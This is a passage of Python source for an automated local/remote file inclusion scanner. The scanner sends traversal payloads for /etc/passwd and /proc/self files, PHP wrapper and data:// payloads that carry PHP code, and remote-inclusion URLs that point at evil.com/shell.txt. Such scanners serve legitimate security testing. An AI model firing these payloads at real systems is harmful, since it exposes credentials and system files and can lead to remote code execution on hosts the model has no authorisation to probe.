                    # Check for sensitive content
                    if sig_type in ["php_source", "config_files", "ssh_keys"]:
                        source_disclosed = True
                        confidence += 15
        
        # Check for error messages (partial LFI)
        for error in cls.ERROR_INDICATORS:
            if error.lower() in content.lower() and error.lower() not in baseline_content.lower():
                evidence.append(f"Error indicator: {error}")
                confidence += 10
        
        # Check for RCE success (data://, expect://)
        if rce_possible:
            rce_indicators = [
                "LFI_TEST",
                "uid=",
                "gid=",
                "groups=",
                "/home/",
                "/root",
            ]
            for indicator in rce_indicators:
                if indicator in content and indicator not in baseline_content:
                    evidence.append(f"RCE indicator: {indicator}")
                    confidence += 30
                    break
        
        # Response length change
        if baseline_content:
            len_diff = abs(len(content) - len(baseline_content))
            if len_diff > 100:
                evidence.append(f"Response length change: {len_diff} bytes")
                if len_diff > 500:
                    confidence += 10
        
        # Cap confidence
        confidence = min(confidence, 100)
        
        return LFIResult(
            vulnerable=confidence >= 40,
            lfi_type=lfi_type,
            confidence_score=confidence,
            payload=payload,
            evidence=evidence,
            file_content=file_content or (content[:500] if confidence >= 60 else None),
            target_os=target_os,
            wrapper_used=wrapper_used,
            rce_possible=rce_possible and confidence >= 50,
            source_disclosed=source_disclosed,
        )


class LFIScanner(ScanModule):
    """
    Local/Remote File Inclusion Scanner v3.0 GOD-MODE.
    
    Comprehensive LFI/RFI detection with:
    - Multi-OS path traversal
    - 20+ encoding bypass techniques
    - PHP wrapper exploitation
    - Log poisoning detection
    - RFI detection
    - Cross-validation and confidence scoring
    """
    
    name = "lfi_scanner"
    version = LFI_SCANNER_VERSION
    
    def __init__(
        self,
        settings: Settings,
        *,
        findings_store: Any = None,
        rate_limiter: Any = None,
    ) -> None:
        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
        self.findings: list[dict[str, Any]] = []
        self.detected_waf: Optional[WAFType] = None
        self.tested_payloads: set[str] = set()
        self.baseline_responses: dict[str, str] = {}
        self.detected_os: Optional[TargetOS] = None
        # Load configurable limits
        self._limits = self._load_limits()

        # THEME-1 FIX: Configurable payload testing depth (prevent premature abandonment)
        # FN-FIX 2026-02-08: Increased all limits to reduce false negatives
        self.max_traversal_payloads = 50  # FN-FIX: Was 20 - deep paths need 50+
        self.max_findings_per_param = 10  # FN-FIX: Was 3 - capture multiple files
        self.max_wrapper_payloads = 25    # FN-FIX: Was 12 - test all major wrappers
        self.max_form_payloads = 15       # FN-FIX: Was 8 - test more form payloads

    def _load_limits(self) -> dict:
        """Load LFI scanner limits from config."""
        try:
            from core.config_manager import get_scanner_limits
            limits = get_scanner_limits()
            return {
                "max_traversal_depth": limits.lfi.max_traversal_depth,
                "max_wrapper_tests": limits.lfi.max_wrapper_tests,
                "max_encoding_variations": limits.lfi.max_encoding_variations,
            }
        except Exception:
            # Fallback defaults
            return {
                "max_traversal_depth": 10,
                "max_wrapper_tests": 8,
                "max_encoding_variations": 6,
            }
    
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> dict[str, Any]:
        """Execute comprehensive LFI/RFI scan."""
        self.findings = []
        self.tested_payloads = set()

        base_url = resolve_base_url(host)
        # GAP-A1 FIX 2026-02-18: Use "endpoints" key (what full_scanner provides)
        # Bug: Was using "urls" which is always empty!
        if isinstance(asset_data, dict):
            urls = asset_data.get("endpoints", []) or asset_data.get("urls", [])
        if isinstance(asset_data, dict):
            forms = asset_data.get("forms", [])

        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
        self._ctx = ScanContext(asset_data)
        self._ctx.log_context_status()
        self._auth_headers = self._ctx.auth_headers

        # PERF-FIX 2026-02-20: Store asset_data for intelligent payload selection
        self._asset_data = asset_data

        # SHARED FINDINGS STORE: Cross-module targeting
        if isinstance(asset_data, dict):
            shared_store = asset_data.get("shared_findings_store")
        if shared_store:
            from utils.shared_findings_store import VulnType
            existing_urls = {u.split("?")[0] if "?" in u else u for u in urls}
            # LFI often works where other file-related vulns work
            for vtype in [VulnType.SSRF, VulnType.XXE, VulnType.COMMAND_INJECTION]:
                for sf in shared_store.get_findings_by_type(vtype):
                    if sf.endpoint and sf.endpoint not in existing_urls:
                        urls.append(sf.endpoint)
                        logger.debug(f"[LFI] Cross-module target from {sf.module}: {sf.endpoint}")

        # TOOL_DISCOVERED_PARAMS: Add Arjun-discovered params to endpoints
        if isinstance(asset_data, dict):
            tool_params = asset_data.get("tool_discovered_params") or {}
        if tool_params:
            lfi_params = ["file", "path", "page", "include", "doc", "folder", "root",
                          "lang", "template", "filename", "document", "dir"]
            new_urls = []
            for url in urls:
                parsed = urlparse(url)
                if parsed.netloc in tool_params:
                    for param in tool_params[parsed.netloc]:
                        # Prioritize params that sound like file inclusion
                        if any(lfi_word in param.lower() for lfi_word in lfi_params):
                            test_url = f"{url}{'&' if '?' in url else '?'}{param}=test"
                            if test_url not in urls:
                                new_urls.append(test_url)
                                logger.debug(f"[LFI] Adding Arjun param: {param}")
            urls.extend(new_urls[:20])  # Limit expansion

        # ENHANCEMENT 2026-02-20: Get endpoint_params and vuln_type_hints from metadata discovery
        # This enables testing of endpoints discovered from /scanner, /api-docs, etc.
        endpoint_params: dict[str, list[str]] = {}
        vuln_type_hints: dict[str, list[str]] = {}
        if isinstance(asset_data, dict):
            endpoint_params = asset_data.get("endpoint_params", {})
            vuln_type_hints = asset_data.get("vuln_type_hints", {})
        if endpoint_params:
            logger.info(f"[LFI] Received {len(endpoint_params)} endpoints with params from metadata discovery")

        # Add metadata-discovered endpoints with PATH_TRAVERSAL hints to url list
        lfi_hint_types = {"PATH_TRAVERSAL", "LFI", "LOCAL_FILE_INCLUSION", "FILE_INCLUSION", "DIRECTORY_TRAVERSAL"}
        for ep_url, hints in vuln_type_hints.items():
            if not any(h in lfi_hint_types for h in hints):
                continue
            # Normalize URL
            if ep_url.startswith("/"):
                full_url = f"{base_url}{ep_url}"
            elif not ep_url.startswith("http"):
                full_url = f"{base_url}/{ep_url}"
            else:
                full_url = ep_url
            # Add with parameters
            params = endpoint_params.get(ep_url, ["file", "path", "page", "include"])
            for param in params[:3]:  # Limit to 3 params
                test_url = f"{full_url}?{param}=test" if "?" not in full_url else f"{full_url}&{param}=test"
                if test_url not in urls:
                    urls.append(test_url)
                    logger.debug(f"[LFI] Adding metadata endpoint: {test_url}")
        if vuln_type_hints:
            lfi_hinted = sum(1 for hints in vuln_type_hints.values() if any(h in lfi_hint_types for h in hints))
            if lfi_hinted > 0:
                logger.info(f"[LFI] Added {lfi_hinted} endpoints with PATH_TRAVERSAL/LFI hints")

        # GAP-4 FIX 2026-02-18: Generate parameterized URLs for known LFI-vulnerable paths
        # Problem: Discovery often finds /vulnerabilities/fi/ but not /vulnerabilities/fi/?page=file1.php
        # Solution: Generate fallback parameterized variants for known LFI patterns
        if not any('?' in u for u in urls):
            parameterized = self._generate_parameterized_endpoints(urls, base_url)
            if parameterized:
                urls.extend(parameterized)
                logger.info(f"[LFI] Generated {len(parameterized)} parameterized endpoint fallbacks")

        logger.info(f"🎯 LFI/RFI Scanner v{self.version} starting on {host}")
        if self._ctx.has_auth:
            logger.info(f"[LFI] Using authenticated session ({self._ctx.auth_method})")

        async with get_scan_client(
            timeout=self.timeout,
            follow_redirects=True,
            custom_headers=self._auth_headers,
        ) as client:
            
            # Phase 1: WAF Detection
            self.detected_waf = await self._detect_waf(client, base_url, rate_limiter)
            if self.detected_waf:
                logger.info(f"🛡️ WAF detected: {self.detected_waf.value}")
            
            # Phase 2: Collect baseline responses
            await self._collect_baselines(client, urls, rate_limiter)
            
            # Phase 3: Path Traversal Testing
            await self._test_path_traversal(client, base_url, urls, rate_limiter)
            
            # Phase 4: PHP Wrapper Testing
            await self._test_php_wrappers(client, base_url, urls, rate_limiter)
            
            # Phase 5: Form Testing
            await self._test_forms(client, base_url, forms, rate_limiter)
            
            # Phase 6: RFI Testing
            await self._test_rfi(client, base_url, urls, rate_limiter)
            
            # Phase 7: Log Poisoning
            await self._test_log_poisoning(client, base_url, urls, rate_limiter)
            
            # Phase 8: Session Inclusion
            await self._test_session_inclusion(client, base_url, urls, rate_limiter)
            
            # Phase 9: Proc/Self Exploitation
            await self._test_proc_self(client, base_url, urls, rate_limiter)
            
            # Phase 10: Encoding Bypass Tests
            await self._test_encoding_bypass(client, base_url, urls, rate_limiter)

            # Phase 11: PHP Legacy LFI Testing (2026-02-16)
            # Specifically for DVWA, bWAPP, Mutillidae and legacy PHP apps
            await self._test_php_legacy_lfi(client, base_url, urls, rate_limiter)

        logger.info(f"[LFI] Scan completed. Found {len(self.findings)} vulnerabilities")

        # CROSS-MODULE SHARING: Add findings to SharedFindingsStore
        try:
            from utils.shared_findings_store import SharedFindingsStore, VulnType
            store = SharedFindingsStore.get_instance()

            for f in self.findings:
                if isinstance(f, dict):
                    metadata = f.get("metadata", {})

                    # Construir o dict de forma segura
                    finding_data = {
                        "type": VulnType.PATH_TRAVERSAL,
                        "severity": f.get("severity", "HIGH"),
                    }

                    if isinstance(f, dict):
                        finding_data["endpoint"] = f.get("matched_at") or metadata.get("url", "")
                        finding_data["parameter"] = metadata.get("param") or metadata.get("vulnerable_param", "")
                        finding_data["file_disclosed"] = metadata.get("file_disclosed", "")

                    await store.add_finding(finding_data, module="lfi")

            if self.findings:
                logger.debug(f"[LFI] Shared {len(self.findings)} findings to cross-module store")

        except Exception as e:
            logger.debug(f"[LFI] Could not share findings: {e}")


        return {
            "module": self.name,
            "version": self.version,
            "findings": self.findings,
            "waf_detected": self.detected_waf.value if self.detected_waf else None,
            "detected_os": self.detected_os.value if self.detected_os else None,
        }
    
    async def _detect_waf(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> Optional[WAFType]:
        """Detect WAF presence."""
        await rate_limiter.acquire()
        
        test_url = f"{base_url}/?file=../../../etc/passwd"
        
        try:
            response = await client.get(test_url)
            return WAFDetector.detect(response)
        except Exception:
            return None
    
    async def _collect_baselines(
        self,
        client: httpx.AsyncClient,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Collect baseline responses for comparison."""
        for url in urls[:30]:
            await rate_limiter.acquire()
            try:
                response = await client.get(url)

                # RESPONSE VALIDATION: Skip login pages, SPA fallbacks
                if hasattr(self, "_ctx") and not self._ctx.is_meaningful_response(
                    response.text,
                    response.status_code,
                    response.headers.get("content-type", ""),
                    url,
                ):
                    logger.debug(f"[LFI] Skipping baseline {url} - login/SPA/error page")
                    continue

                self.baseline_responses[url] = response.text
            except Exception:
                pass
    
    def _generate_parameterized_endpoints(self, urls: list[str], base_url: str) -> list[str]:
        """
        Generate parameterized URLs for known LFI-vulnerable paths.

        GAP-4 FIX 2026-02-18: When discovery only finds base paths like /vulnerabilities/fi/,
        this generates the parameterized variants like /vulnerabilities/fi/?page=file1.php.

        See auditdocs/MASSIVE_GAP_AUDIT_2026-02-18.md for details.
        """
        generated = []
        seen = set()

        # Known LFI-vulnerable path patterns and their default parameters
        LFI_PATH_PATTERNS = {
            # DVWA
            "/fi/": [("page", "file1.php"), ("page", "include.php")],
            "/vulnerabilities/fi/": [("page", "file1.php"), ("page", "include.php")],
            # bWAPP
            "/bWAPP/rlfi.php": [("language", "lang_en.php")],
            "/bWAPP/directory_traversal_1.php": [("page", "message.txt")],
            "/bWAPP/directory_traversal_2.php": [("directory", "documents")],
            # Mutillidae
            "/index.php": [("page", "home.php"), ("page", "login.php")],
            "/mutillidae/index.php": [("page", "home.php")],
            # Generic
            "/include.php": [("file", "header.php"), ("page", "index.php")],
            "/load.php": [("file", "content.txt")],
            "/view.php": [("file", "readme.txt"), ("doc", "help.txt")],
            "/page.php": [("p", "home"), ("page", "main.php")],
            "/read.php": [("file", "data.txt")],
            "/download.php": [("file", "document.pdf")],
        }

        for url in urls:
            parsed = urlparse(url)
            path = parsed.path.lower()

            # Check if URL matches any known LFI pattern
            for pattern, params in LFI_PATH_PATTERNS.items():
                if pattern in path or path.endswith(pattern.rstrip('/')):
                    for param_name, default_value in params:
                        # Build parameterized URL
                        param_url = f"{url.rstrip('/')}?{param_name}={default_value}"
                        if param_url not in seen:
                            seen.add(param_url)
                            generated.append(param_url)

        # Also try common LFI params on any PHP/ASP files
        for url in urls:
            if any(ext in url.lower() for ext in ['.php', '.asp', '.aspx', '.jsp']):
                for param in ['file', 'page', 'include', 'path', 'doc', 'template']:
                    param_url = f"{url}{'&' if '?' in url else '?'}{param}=test.txt"
                    if param_url not in seen:
                        seen.add(param_url)
                        generated.append(param_url)

        # Generate parameterized URLs for base_url known paths (training app detection)
        base_parsed = urlparse(base_url)
        if any(app in base_parsed.netloc.lower() or app in base_url.lower()
               for app in ['localhost', '127.0.0.1', 'dvwa', 'bwapp', 'mutillidae']):
            # This looks like a training app - add common LFI endpoints
            training_endpoints = [
                f"{base_url.rstrip('/')}/vulnerabilities/fi/?page=file1.php",
                f"{base_url.rstrip('/')}/vulnerabilities/fi/?page=include.php",
                f"{base_url.rstrip('/')}/index.php?page=home.php",
            ]
            for ep in training_endpoints:
                if ep not in seen:
                    seen.add(ep)
                    generated.append(ep)

        return list(generated)

    def _find_vulnerable_params(self, urls: list[str]) -> list[tuple[str, str, dict]]:
        """Find parameters likely vulnerable to LFI."""
        vulnerable = []
        seen = set()

        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                if param_name.lower() in PayloadGenerator.LFI_PARAMS:
                    key = f"{parsed.path}:{param_name}"
                    if key not in seen:
                        seen.add(key)
                        vulnerable.append((url, param_name, parsed))

        return vulnerable
    
    async def _test_path_traversal(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test for path traversal vulnerabilities."""
        vulnerable_params = self._find_vulnerable_params(urls)
        
        # Target files based on detected OS or both
        target_files = [
            "/etc/passwd",
            "/etc/hosts",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\win.ini",
        ]
        
        for url, param_name, parsed in vulnerable_params[:20]:
            baseline = self.baseline_responses.get(url, "")
            param_findings_count = 0  # THEME-1 FIX: Track findings per param

            for target_file in target_files:
                # Use configurable traversal depth from scanner_limits.lfi
                depth = self._limits.get("max_traversal_depth", 10)
                payloads = PayloadGenerator.generate_traversal_payloads(target_file, depth=depth)

                # PERF-FIX 2026-02-20: Try intelligent payload selection
                intelligent_payloads = await self._get_intelligent_payloads(
                    category="lfi",
                    endpoint=url,
                    param_name=param_name,
                    max_payloads=30,
                    asset_data=getattr(self, '_asset_data', None),
                )
                if intelligent_payloads:
                    # Use intelligent payloads first, then fallback to generated payloads
                    intelligent_list = [(p[0], f"intelligent: {p[1]}") for p in intelligent_payloads]
                    payloads = intelligent_list + payloads[:20]

                # THEME-1 FIX: Test more traversal payloads for thorough coverage
                for payload, description in payloads[:self.max_traversal_payloads]:
                    # THEME-1 FIX: Continue after findings but cap at max per param
                    if param_findings_count >= self.max_findings_per_param:
                        break

                    await rate_limiter.acquire()

                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    query = urlencode(params, doseq=True)

                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

                    if test_url in self.tested_payloads:
                        continue
                    self.tested_payloads.add(test_url)

                    try:
                        response = await client.get(test_url)
                        result = ResponseAnalyzer.analyze(response, payload, baseline)

                        if result.vulnerable:
                            # GAP-2 FIX 2026-02-13: Negative control check
                            # Verify file content indicator doesn't appear with benign input
                            indicator = None
                            if result.file_content:
                                # Use first line of file content as indicator
                                indicator = result.file_content.split('\n')[0][:50] if '\n' in result.file_content else result.file_content[:50]
                            elif result.evidence:
                                # Use first evidence line as indicator
                                indicator = str(result.evidence[0])[:50] if result.evidence else None

                            if indicator:
                                is_valid = await self.quick_negative_control(
                                    http_client=client,
                                    url=base_url,
                                    param=param_name,
                                    indicator=indicator,
                                    vuln_vuln_type=VulnType.LFI,
                        category=VulnCategory.SERVER_SIDE,
                                )
                                if not is_valid:
                                    logger.debug(f"[LFI] Negative control failed for {param_name}: indicator appears with benign input")
                                    continue  # Skip this FP

                            if result.target_os:
                                self.detected_os = result.target_os

                            self._add_finding(
                                name="Local File Inclusion (Path Traversal)",
                                description=f"Path traversal vulnerability in parameter '{param_name}'. {description}",
                                severity=Severity.HIGH if not result.source_disclosed else "CRITICAL",
                                host=base_url,
                                endpoint=test_url,
                                result=result,
                                param=param_name,
                            )
                            param_findings_count += 1
                            # THEME-1 FIX: Continue to find more files/traversal patterns

                    except Exception as e:
                        logger.debug(f"Path traversal test error: {e}")
    
    async def _test_php_wrappers(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test PHP stream wrappers."""
        vulnerable_params = self._find_vulnerable_params(urls)
        
        # Generate wrapper payloads
        wrapper_payloads = PayloadGenerator.generate_wrapper_payloads("/etc/passwd")
        wrapper_payloads.extend(PayloadGenerator.generate_wrapper_payloads("index.php"))
        wrapper_payloads.extend(PayloadGenerator.generate_wrapper_payloads("../config.php"))
        
        for url, param_name, parsed in vulnerable_params[:15]:
            baseline = self.baseline_responses.get(url, "")
            wrapper_findings_count = 0  # THEME-1 FIX: Track findings per param

            for payload, description, wrapper in wrapper_payloads[:20]:
                # THEME-1 FIX: Continue after findings but cap at max per param
                if wrapper_findings_count >= self.max_findings_per_param:
                    break

                await rate_limiter.acquire()

                params = parse_qs(parsed.query)
                params[param_name] = [payload]
                query = urlencode(params, doseq=True)

                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

                if test_url in self.tested_payloads:
                    continue
                self.tested_payloads.add(test_url)

                try:
                    # Special handling for php://input
                    if wrapper == PHPWrapper.INPUT:
                        response = await client.post(
                            test_url,
                            content="<?php echo 'LFI_TEST'; ?>"
                        )
                    else:
                        response = await client.get(test_url)

                    result = ResponseAnalyzer.analyze(response, payload, baseline)

                    if result.vulnerable:
                        severity = "CRITICAL" if result.rce_possible else "HIGH"

                        self._add_finding(
                            name=f"PHP Wrapper Exploitation ({description})",
                            description=f"PHP wrapper '{wrapper.value}' is exploitable via parameter '{param_name}'.",
                            severity=severity,
                            host=base_url,
                            endpoint=test_url,
                            result=result,
                            param=param_name,
                        )
                        wrapper_findings_count += 1
                        # THEME-1 FIX: Continue to find more wrappers/files

                except Exception as e:
                    logger.debug(f"PHP wrapper test error: {e}")
    
    async def _test_forms(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        forms: list[dict],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test forms for LFI vulnerabilities."""
        for form in forms[:30]:
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            inputs = form.get("inputs", [])
            
            # Find file-related inputs
            file_inputs = [
                inp for inp in inputs
                if any(s in inp.get("name", "").lower() for s in PayloadGenerator.LFI_PARAMS)
            ]
            
            if not file_inputs:
                continue
            
            form_url = urljoin(base_url, action) if action else base_url

            # THEME-1 FIX: Expanded form LFI payloads for thorough coverage
            payloads = [
                ("../../../etc/passwd", "Basic traversal"),
                ("....//....//....//etc/passwd", "Filter bypass"),
                ("php://filter/convert.base64-encode/resource=/etc/passwd", "PHP filter"),
                ("..%2F..%2F..%2Fetc%2Fpasswd", "URL encoded traversal"),
                ("..\\..\\..\\etc\\passwd", "Backslash traversal"),
                ("/etc/passwd%00.jpg", "Null byte extension bypass"),
                ("php://input", "PHP input stream"),
                ("data://text/plain;base64,PD9waHAgZWNobyAnTEZJX1RFU1QnOyA/Pg==", "Data URI"),
            ]

            for file_input in file_inputs[:5]:  # Was [:3]
                input_name = file_input.get("name", "")
                form_findings_count = 0  # THEME-1 FIX: Track findings per input

                # THEME-1 FIX: Test more payloads for thorough coverage
                for payload, description in payloads[:self.max_form_payloads]:
                    # THEME-1 FIX: Continue after findings but cap at max per input
                    if form_findings_count >= self.max_findings_per_param:
                        break

                    await rate_limiter.acquire()

                    form_data = {}
                    for inp in inputs:
                        name = inp.get("name", "")
                        if name:
                            if name == input_name:
                                form_data[name] = payload
                            else:
                                form_data[name] = inp.get("value", "test")

                    try:
                        if method == "POST":
                            response = await client.post(form_url, data=form_data)
                        else:
                            response = await client.get(form_url, params=form_data)

                        result = ResponseAnalyzer.analyze(response, payload)

                        if result.vulnerable:
                            self._add_finding(
                                name="LFI in Form Parameter",
                                description=f"Form input '{input_name}' vulnerable to LFI. {description}",
                                severity=Severity.HIGH,
                                host=base_url,
                                endpoint=form_url,
                                result=result,
                                param=input_name,
                            )
                            form_findings_count += 1
                            # THEME-1 FIX: Continue to find more LFI patterns

                    except Exception as e:
                        logger.debug(f"Form LFI test error: {e}")
    
    async def _test_rfi(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test for Remote File Inclusion."""
        vulnerable_params = self._find_vulnerable_params(urls)
        
        # RFI payloads
        rfi_payloads = [
            ("http://evil.com/shell.txt", "HTTP RFI"),
            ("https://evil.com/shell.txt", "HTTPS RFI"),
            ("//evil.com/shell.txt", "Protocol-relative RFI"),
            ("\\\\evil.com\\shell.txt", "UNC path RFI"),
            ("ftp://evil.com/shell.txt", "FTP RFI"),
            ("http://127.0.0.1:8080/shell.txt", "SSRF via RFI"),
        ]
        
        for url, param_name, parsed in vulnerable_params[:10]:
            baseline = self.baseline_responses.get(url, "")
            
            for payload, description in rfi_payloads:
                await rate_limiter.acquire()
                
                params = parse_qs(parsed.query)
                params[param_name] = [payload]
                query = urlencode(params, doseq=True)
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                
                try:
                    response = await client.get(test_url)
                    content = response.text.lower()

                    # Check if response differs from baseline (avoid FP on generic error pages)
                    if baseline and len(content) > 100 and abs(len(content) - len(baseline)) < 50:
                        # Response too similar to baseline, likely generic error page
                        continue

                    # SUCCESS indicators (actual RFI worked - CRITICAL)
                    success_indicators = [
                        "evil.com",              # Content from our payload URL reflected
                        "shell.txt",             # Filename reflected in included content
                    ]

                    # ATTEMPT indicators (server tried to fetch - HIGH, not CRITICAL)
                    attempt_indicators = [
                        "failed to open stream: http",
                        "failed to open stream: https",
                        "couldn't open remote file",
                        "http request failed",
                        "getaddrinfo failed",    # DNS lookup for evil.com
                        "connection refused",    # Tried to connect
                    ]

                    # BLOCKED indicators (config prevents RFI - INFO only)
                    blocked_indicators = [
                        "wrapper is disabled",
                        "allow_url_include = off",
                        "allow_url_fopen = off",
                        "url file-access is disabled",
                    ]

                    found_success = [i for i in success_indicators if i in content]
                    found_attempt = [i for i in attempt_indicators if i in content]
                    found_blocked = [i for i in blocked_indicators if i in content]

                    # If explicitly blocked, skip (not vulnerable)
                    if found_blocked and not found_success:
                        continue

                    if found_success:
                        # Actual RFI success - CRITICAL
                        self._add_finding(
                            name=f"Remote File Inclusion ({description})",
                            description=f"Parameter '{param_name}' is vulnerable to RFI. Remote content was successfully included.",
                            severity=Severity.CRITICAL,
                            host=base_url,
                            endpoint=test_url,
                            result=LFIResult(
                                vulnerable=True,
                                lfi_type=LFIType.RFI,
                                confidence_score=90.0,
                                payload=payload,
                                evidence=[f"RFI success: {i}" for i in found_success],
                                rce_possible=True,
                            ),
                            param=param_name,
                        )
                        break
                    elif found_attempt:
                        # Server attempted RFI but failed (network/DNS) - still HIGH (would work with reachable host)
                        self._add_finding(
                            name=f"Remote File Inclusion Attempt ({description})",
                            description=f"Parameter '{param_name}' may be vulnerable to RFI. Server attempted to fetch remote content but failed (likely unreachable host).",
                            severity=Severity.HIGH,
                            host=base_url,
                            endpoint=test_url,
                            result=LFIResult(
                                vulnerable=True,
                                lfi_type=LFIType.RFI,
                                confidence_score=70.0,
                                payload=payload,
                                evidence=[f"RFI attempt: {i}" for i in found_attempt],
                                rce_possible=True,
                            ),
                            param=param_name,
                        )
                        break
                        
                except Exception as e:
                    logger.debug(f"RFI test error: {e}")
    
    async def _test_log_poisoning(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test for log poisoning vulnerabilities."""
        vulnerable_params = self._find_vulnerable_params(urls)
        
        if not vulnerable_params:
            return
        
        log_payloads = PayloadGenerator.generate_log_poisoning_paths()
        
        for url, param_name, parsed in vulnerable_params[:5]:
            baseline = self.baseline_responses.get(url, "")
            
            for payload, log_type in log_payloads[:15]:
                await rate_limiter.acquire()
                
                params = parse_qs(parsed.query)
                params[param_name] = [payload]
                query = urlencode(params, doseq=True)
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                
                try:
                    response = await client.get(test_url)
                    content = response.text
                    
                    # Log file indicators
                    log_indicators = [
                        "[error]",
                        "[notice]",
                        "[warn]",
                        "GET /",
                        "POST /",
                        "HTTP/1.",
                        "Mozilla/",
                        "Apache/",
                        "nginx/",
                        " 200 ",
                        " 404 ",
                        " 500 ",
                    ]
                    
                    found = [i for i in log_indicators if i in content and i not in baseline]
                    
                    if len(found) >= 2:
                        self._add_finding(
                            name=f"Log File Inclusion ({log_type})",
                            description=f"Log file accessible via parameter '{param_name}'. Potential for log poisoning RCE.",
                            severity=Severity.HIGH,
                            host=base_url,
                            endpoint=test_url,
                            result=LFIResult(
                                vulnerable=True,
                                lfi_type=LFIType.LOG_POISONING,
                                confidence_score=60,
                                payload=payload,
                                evidence=[f"Log indicator: {i}" for i in found[:3]],
                                rce_possible=True,
                            ),
                            param=param_name,
                        )
                        break
                        
                except Exception as e:
                    logger.debug(f"Log poisoning test error: {e}")
    
    async def _test_session_inclusion(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test for session file inclusion."""
        vulnerable_params = self._find_vulnerable_params(urls)
        
        if not vulnerable_params:
            return
        
        # First, get a session
        await rate_limiter.acquire()
        try:
            response = await client.get(base_url)
            cookies = response.cookies
            
            # Look for PHP session ID
            session_id = None
            for cookie_name in ["PHPSESSID", "SESSID", "session"]:
                if cookie_name in cookies:
                    session_id = cookies[cookie_name]
                    break
            
            if not session_id:
                return
            
            # Generate session file paths
            session_paths = [
                path.format(session_id=session_id)
                for path in PayloadGenerator.SESSION_PATHS
            ]
            
            for url, param_name, parsed in vulnerable_params[:5]:
                for session_path in session_paths:
                    for depth in [5, 7, 10]:
                        traversal = "../" * depth
                        payload = f"{traversal}{session_path.lstrip('/')}"
                        
                        await rate_limiter.acquire()
                        
                        params = parse_qs(parsed.query)
                        params[param_name] = [payload]
                        query = urlencode(params, doseq=True)
                        
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                        
                        try:
                            response = await client.get(test_url)
                            content = response.text
                            
                            # Session file indicators
                            if any(ind in content for ind in ["|s:", "|i:", "|a:", "|O:"]):
                                self._add_finding(
                                    name="Session File Inclusion",
                                    description=f"PHP session file accessible via parameter '{param_name}'. "
                                               f"Potential for session poisoning RCE.",
                                    severity=Severity.CRITICAL,
                                    host=base_url,
                                    endpoint=test_url,
                                    result=LFIResult(
                                        vulnerable=True,
                                        lfi_type=LFIType.SESSION_INCLUSION,
                                        confidence_score=70,
                                        payload=payload,
                                        evidence=[
                                            f"Session ID: {session_id}",
                                            "PHP serialized session data found",
                                        ],
                                        rce_possible=True,
                                    ),
                                    param=param_name,
                                )
                                return
                                
                        except Exception as e:
                            logger.debug(f"Session inclusion test error: {e}")
                            
        except Exception as e:
            logger.debug(f"Session test error: {e}")
    
    async def _test_proc_self(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test /proc/self exploitation."""
        vulnerable_params = self._find_vulnerable_params(urls)
        
        proc_targets = [
            ("/proc/self/environ", "Environment variables"),
            ("/proc/self/cmdline", "Command line"),
            ("/proc/self/status", "Process status"),
            ("/proc/self/fd/0", "File descriptor 0"),
            ("/proc/self/fd/1", "File descriptor 1"),
            ("/proc/self/fd/2", "File descriptor 2"),
            ("/proc/self/cwd", "Current directory"),
            ("/proc/self/exe", "Executable path"),
            ("/proc/version", "Kernel version"),
            ("/proc/net/tcp", "TCP connections"),
            ("/proc/net/udp", "UDP connections"),
        ]
        
        for url, param_name, parsed in vulnerable_params[:10]:
            baseline = self.baseline_responses.get(url, "")
            
            for proc_path, description in proc_targets:
                for depth in [5, 7, 10]:
                    traversal = "../" * depth
                    payload = f"{traversal}{proc_path.lstrip('/')}"
                    
                    await rate_limiter.acquire()
                    
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    query = urlencode(params, doseq=True)
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                    
                    try:
                        response = await client.get(test_url)
                        result = ResponseAnalyzer.analyze(response, payload, baseline)
                        
                        if result.vulnerable:
                            self._add_finding(
                                name=f"Proc Filesystem Access ({description})",
                                description=f"Access to {proc_path} via parameter '{param_name}'.",
                                severity=Severity.HIGH,
                                host=base_url,
                                endpoint=test_url,
                                result=result,
                                param=param_name,
                            )
                            break
                            
                    except Exception as e:
                        logger.debug(f"Proc test error: {e}")
    
    async def _test_encoding_bypass(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test various encoding techniques to bypass filters."""
        vulnerable_params = self._find_vulnerable_params(urls)
        
        # Base payload
        base_payload = "../../../etc/passwd"
        
        for url, param_name, parsed in vulnerable_params[:10]:
            baseline = self.baseline_responses.get(url, "")
            
            # Get all encoding variants
            encoded_payloads = PayloadEncoder.get_all_encodings(base_payload)
            
            for payload, encoding_type in encoded_payloads:
                await rate_limiter.acquire()
                
                params = parse_qs(parsed.query)
